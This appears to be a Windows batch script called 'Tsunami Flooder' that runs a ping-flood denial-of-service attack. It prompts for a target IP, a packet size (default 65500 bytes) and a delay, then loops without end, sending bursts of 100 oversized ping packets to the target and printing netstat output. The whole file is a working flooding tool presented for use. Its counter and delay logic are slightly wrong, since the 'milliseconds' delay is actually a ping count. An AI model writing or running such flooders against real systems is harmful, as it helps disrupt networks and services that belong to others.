@echo off
title Tsunami Flooder - Packet Monitor Edition
color 1f

:: Main Menu
:menu
cls
echo ======================================================
echo                 Tsunami Flooder v4.0
echo ======================================================
echo 1. Start Flood
echo 2. Stop Flood
echo 3. Exit
echo ======================================================
set /p choice="Enter your choice (1-3): "

if "%choice%"=="1" goto start_flood
if "%choice%"=="2" goto stop_flood
if "%choice%"=="3" exit
goto menu

:: Start Flood
:start_flood
cls
echo ======================================================
echo                 Starting Flood
echo ======================================================
set /p targetIP="Enter the target IP (e.g., 127.0.0.1): "
set /p packetSize="Enter packet size in bytes (default: 65500): "
if "%packetSize%"=="" set packetSize=65500

set /p floodSpeed="Enter delay between packets in milliseconds (0 for max speed): "
if "%floodSpeed%"=="" set floodSpeed=0

echo ======================================================
echo Flood Target: %targetIP%
echo Packet Size: %packetSize% bytes
echo Speed: %floodSpeed% ms delay
echo ======================================================
timeout /t 2 >nul
cls

echo ======================================================
echo Flood has started! Press Ctrl+C to stop.
echo ======================================================
set packetsSent=0

:flood_loop
ping %targetIP% -l %packetSize% -n 100 >nul   :: Envia 100 pacotes por vez
set /a packetsSent+=100

:: Display packet count and netstat output periodically
if %packetsSent% lss 50 (
    echo Packets Sent: %packetsSent%
) else (
    echo Packets Sent: %packetsSent%
    echo Displaying active connections:
    netstat -n | find "%targetIP%"
    set /a packetsSent=0
)

:: Add delay for speed control
if "%floodSpeed%" NEQ "0" ping localhost -n %floodSpeed% >nul

goto flood_loop

:: Stop Flood
:stop_flood
cls
echo ======================================================
echo                Stopping Flood
echo ======================================================
timeout /t 2 >nul
taskkill /f /im ping.exe >nul
echo Flood stopped. Returning to menu...
timeout /t 2 >nul
goto menu
